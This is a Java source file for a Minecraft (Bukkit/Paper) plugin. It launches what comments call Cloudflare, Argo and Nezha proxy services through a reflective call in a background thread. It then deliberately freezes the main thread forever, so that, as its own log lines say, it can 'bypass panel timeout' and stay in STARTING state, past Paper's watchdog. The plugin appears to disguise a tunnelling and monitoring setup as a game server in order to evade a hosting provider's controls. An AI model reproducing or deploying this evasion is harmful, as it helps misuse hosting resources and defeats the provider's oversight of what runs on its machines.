package ua.nanit.limbo;

import org.bukkit.plugin.java.JavaPlugin;

public class PluginMain extends JavaPlugin {
    
    @Override
    public void onEnable() {
        getLogger().info("--------------------------------------------------");
        getLogger().info(" Starting NanoPlugin Proxy Services in background");
        getLogger().info("--------------------------------------------------");
        
        // Start the proxy logic (App.java) in a background thread
        new Thread(() -> {
            try {
                // Call the original App.main which sets up Cloudflare, Argo, Nezha, etc.
                Class.forName("App").getMethod("main", String[].class).invoke(null, (Object) new String[0]);
            } catch (Exception e) {
                getLogger().severe("Failed to start proxy services: " + e.getMessage());
                e.printStackTrace();
            }
        }, "NanoPlugin-Proxy-Thread").start();

        getLogger().info("--------------------------------------------------");
        getLogger().info(" Proxy started. Freezing main thread to bypass panel timeout.");
        getLogger().info(" Server will remain in STARTING state forever.");
        getLogger().info("--------------------------------------------------");

        // Freeze the main thread infinitely to prevent "Done" from ever printing.
        // Paper's watchdog won't crash us because the server tick loop hasn't started yet.
        while (true) {
            try {
                Thread.sleep(Long.MAX_VALUE);
            } catch (InterruptedException e) {
                // Ignore
            }
        }
    }
}
